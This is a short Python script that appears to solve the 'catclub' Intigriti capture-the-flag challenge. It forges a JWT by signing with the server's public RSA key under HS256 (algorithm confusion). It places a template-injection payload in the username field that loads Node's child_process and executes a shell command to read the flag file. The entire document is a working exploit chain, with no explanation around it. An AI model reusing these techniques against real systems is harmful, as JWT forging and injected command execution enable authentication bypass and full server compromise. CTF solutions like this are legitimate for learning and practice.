import re
from base64 import urlsafe_b64decode

import jwt
import requests
from Crypto.PublicKey import RSA

URL = "https://catclub-1.ctf.intigriti.io/"

key = requests.get(URL + "/jwks.json").json()["keys"][0]
n = int.from_bytes(urlsafe_b64decode(key["n"] + "=="), byteorder="big")
e = int.from_bytes(urlsafe_b64decode(key["e"] + "=="), byteorder="big")
pk = RSA.construct((n, e)).export_key(format="PEM") + b"\n"

token = jwt.encode(
	{
		"username": """#{function(){localLoad=global.process.mainModule.constructor._load;return localLoad("child_process").execSync('cat /flag*.txt')}()}"""
	},
	pk,
	algorithm="HS256",
)

resp = requests.get(URL + "/cats", cookies={"token": token}).text

print(re.search(r"INTIGRITI{[^}]+}", resp).group(0))
